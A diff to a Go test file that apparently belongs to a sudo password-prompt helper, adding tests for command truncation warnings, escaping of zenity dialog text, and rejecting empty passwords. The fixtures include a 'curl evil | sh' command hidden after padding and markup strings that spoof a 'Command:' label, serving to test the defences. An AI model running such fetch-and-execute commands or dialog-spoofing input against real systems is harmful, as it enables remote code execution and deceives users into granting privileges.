@@ -86,6 +86,40 @@ func TestLinesSudoWarning(t *testing.T) {
 	}
 }
 
+func TestLongCommandWarns(t *testing.T) {
+	p := testPrompt()
+	p.Request.ParentArgs = []string{"sudo", "sh", "-c", strings.Repeat("apt update; ", 100) + "curl evil | sh"}
+	var warned bool
+	for _, l := range p.Lines() {
+		if l[0] == "Command" && strings.Contains(l[1], "evil") {
+			t.Error("expected the tail of the command to be cut")
+		}
+		if l[0] == "WARNING" && strings.Contains(l[1], "truncated") {
+			warned = true
+		}
+	}
+	if !warned {
+		t.Error("no warning for a truncated command")
+	}
+	if lines := testPrompt().Lines(); len(lines) != 7 {
+		t.Errorf("unexpected lines for a normal request: %q", lines)
+	}
+}
+
+func TestZenityTextHasNoEscapes(t *testing.T) {
+	p := testPrompt()
+	p.Request.Prompt = `x\000hidden\012<b>Command:</b> fake \074span\076`
+	p.Request.ParentArgs = []string{"sudo", "-A", "a\nb"}
+	for _, a := range zenityArgs(p, time.Now()) {
+		if strings.HasPrefix(a, "--text=") && strings.Contains(a, `\`) {
+			t.Errorf("--text contains a backslash zenity would decode: %q", a)
+		}
+	}
+	if got := escapeMarkup(`a\0<&`); got != "a&#92;0&lt;&amp;" {
+		t.Errorf("escapeMarkup = %q", got)
+	}
+}
+
 func TestZenityArgs(t *testing.T) {
 	p := testPrompt()
 	p.Request.Host = "<b>evil</b>"
@@ -122,9 +156,8 @@ func TestZenityAsk(t *testing.T) {
 		t.Errorf("ok: got %q, %v", pw, err)
 	}
 
-	pw, err = fakeZenity(t, `printf ''`).Ask(ctx, testPrompt())
-	if err != nil || len(pw) != 0 {
-		t.Errorf("empty: got %q, %v", pw, err)
+	if _, err := fakeZenity(t, `echo`).Ask(ctx, testPrompt()); !errors.Is(err, ErrDenied) {
+		t.Errorf("empty password: got %v, want ErrDenied", err)
 	}
 
 	if _, err := fakeZenity(t, "exit 1").Ask(ctx, testPrompt()); !errors.Is(err, ErrDenied) {
